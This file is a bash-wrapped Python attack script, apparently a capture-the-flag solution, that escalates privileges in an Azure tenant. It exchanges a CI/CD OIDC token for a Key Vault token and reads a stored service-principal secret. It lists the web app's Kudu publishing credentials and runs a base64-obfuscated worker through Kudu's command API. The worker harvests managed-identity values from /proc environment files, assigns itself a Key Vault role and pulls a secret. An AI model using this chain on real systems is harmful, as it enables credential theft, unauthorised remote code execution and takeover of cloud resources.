#!/usr/bin/env bash
set +e
python3 - <<'PY'
import base64, json, os, time, urllib.parse, urllib.request, urllib.error, uuid

TEN="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
CID="72ff278a-9e71-43ec-bac4-2ca303f8e462"
RG_R="rg-tbl-reporting-prod-eus"
APP="app-tbl-reporting-prod"
KV_PROD="https://kv-tbl-prod-x3euoz.vault.azure.net"

def rq(u, m="GET", d=None, h=None, t=35):
    try:
        r = urllib.request.urlopen(urllib.request.Request(u, data=d, method=m, headers=h or {}), timeout=t)
        return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:
        return 0, str(e).encode()

def fpost(u, o):
    s, b = rq(u, "POST", urllib.parse.urlencode(o).encode(),
             {"Content-Type": "application/x-www-form-urlencoded"})
    return s, json.loads(b.decode())

# step 1: OIDC JWT
req = os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"] + "&audience=api%3A%2F%2FAzureADTokenExchange"
s, b = rq(req, "GET", None,
         {"Authorization": "Bearer " + os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
oidc = json.loads(b.decode())["value"]
print("OIDC_LEN", len(oidc), flush=True)

# step 2: FIC -> vault token for cicd-deployer
s, d = fpost(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token", {
    "client_id": CID,
    "grant_type": "client_credentials",
    "scope": "https://vault.azure.net/.default",
    "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
    "client_assertion": oidc,
})
vt = d["access_token"]
print("VAULT_TOK", len(vt), flush=True)

# step 3: read SP secret
s, b = rq(KV_PROD + "/secrets/reporting-service-principal?api-version=7.4", "GET", None,
         {"Authorization": "Bearer " + vt})
sp = json.loads(json.loads(b.decode())["value"])
spcid = sp.get("appId") or sp.get("clientId")
spsec = sp.get("clientSecret") or sp.get("password")
print("SP_APPID", spcid, flush=True)

# step 4: ARM token with that SP
s, d = fpost(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token", {
    "client_id": spcid,
    "grant_type": "client_credentials",
    "client_secret": spsec,
    "scope": "https://management.azure.com/.default",
})
arm = d["access_token"]
print("ARM_TOK", len(arm), flush=True)

# step 5: Kudu publishing creds
s, b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{RG_R}/providers/Microsoft.Web/sites/{APP}/config/publishingcredentials/list?api-version=2023-01-01",
         "POST", b"{}",
         {"Authorization": "Bearer " + arm, "Content-Type": "application/json"})
pub = json.loads(b.decode())["properties"]
ku = pub["publishingUserName"]
kp = pub["publishingPassword"]
auth = base64.b64encode((ku + ":" + kp).encode()).decode()
print("KUDU_USER_OK", bool(ku), "KUDU_PASS_LEN", len(kp), flush=True)

# step 6: run worker on the reporting app via Kudu /api/command
worker = r'''
import base64, json, os, time, urllib.parse, urllib.request, urllib.error, glob, uuid
env = dict(os.environ)
for p in glob.glob("/proc/[0-9]*/environ"):
    try:
        for item in open(p, "rb").read().split(b"\x00"):
            if b"=" in item:
                k, v = item.split(b"=", 1); k = k.decode("replace")
                if k in ("IDENTITY_ENDPOINT", "IDENTITY_HEADER") and k not in env:
                    env[k] = v.decode("replace")
    except Exception: pass
IE = env.get("IDENTITY_ENDPOINT", "")
IH = env.get("IDENTITY_HEADER", "")
MIRES = "/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.ManagedIdentity/userAssignedIdentities/id-tbl-reporting-writer"
print("IDENTITY_ENDPOINT", IE, "HAS_HDR", bool(IH), flush=True)
def rq(u, h={}, m="GET", d=None, t=25):
    try:
        r = urllib.request.urlopen(urllib.request.Request(u, headers=h, data=d, method=m), timeout=t)
        return r.status, r.read().decode("replace")
    except urllib.error.HTTPError as e: return e.code, e.read().decode("replace")
    except Exception as e: return 0, repr(e)
def mitok(res):
    q = IE + "?resource=" + urllib.parse.quote(res, safe="") + "&api-version=2019-08-01&mi_res_id=" + urllib.parse.quote(MIRES)
    s, b = rq(q, {"X-IDENTITY-HEADER": IH})
    if s == 200:
        try: return json.loads(b)["access_token"]
        except Exception: return ""
    print("MI_FAIL", res, s, b[:200], flush=True); return ""
vt = mitok("https://vault.azure.net")
at = mitok("https://management.azure.com")
print("MI_VT_LEN", len(vt), "MI_AT_LEN", len(at), flush=True)
seg = vt.split(".")[1]; seg += "=" * (-len(seg) % 4)
oidv = json.loads(base64.urlsafe_b64decode(seg))["oid"]
print("MI_OID", oidv, flush=True)
scope = "subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz"
url = "https://management.azure.com/" + scope + "/providers/Microsoft.Authorization/roleAssignments/" + str(uuid.uuid4()) + "?api-version=2022-04-01"
body = json.dumps({"properties": {
    "roleDefinitionId": "/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/providers/Microsoft.Authorization/roleDefinitions/4633458b-17de-408a-b874-0445c86b69e6",
    "principalId": oidv, "principalType": "ServicePrincipal"}}).encode()
s, b = rq(url, {"Authorization": "Bearer " + at, "Content-Type": "application/json"}, "PUT", body, 30)
print("ROLE_ASSIGN", s, b[:300], flush=True)
for i in range(30):
    s, b = rq("https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/flag?api-version=7.4",
              {"Authorization": "Bearer " + mitok("https://vault.azure.net")})
    print("FLAG_TRY", i+1, "status", s, "body", b[:400], flush=True)
    if s == 200:
        try: print("FLAG_VALUE=" + json.loads(b)["value"], flush=True)
        except Exception: pass
        break
    time.sleep(6)
'''
enc = base64.b64encode(worker.encode()).decode()
cmd = "python3 -c \"import base64;exec(base64.b64decode('" + enc + "').decode())\" 2>&1"
s, b = rq(f"https://{APP}.scm.azurewebsites.net/api/command", "POST",
         json.dumps({"command": cmd, "dir": "site/wwwroot"}).encode(),
         {"Authorization": "Basic " + auth, "Content-Type": "application/json"}, 300)
print("KUDU_STATUS", s, flush=True)
try:
    d = json.loads(b.decode())
    print("--- KUDU_STDOUT ---"); print(d.get("Output", ""))
    print("--- KUDU_STDERR ---"); print(d.get("Error", ""))
except Exception:
    print("KUDU_RAW:", b.decode("replace")[:4000])
PY
